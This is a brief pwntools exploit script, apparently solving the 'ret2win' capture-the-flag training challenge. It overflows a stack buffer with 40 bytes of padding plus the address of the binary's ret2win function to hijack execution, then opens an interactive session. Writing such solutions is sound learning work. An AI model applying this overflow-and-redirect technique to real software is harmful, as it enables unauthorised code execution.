from pwn import *
e = ELF("./ret2win")
p = process("./ret2win")
ret2win = p64(e.symbols["ret2win"])
print ret2win
print p.recv()
p.sendline("a"*40+ret2win)

print p.recv()

p.interactive()

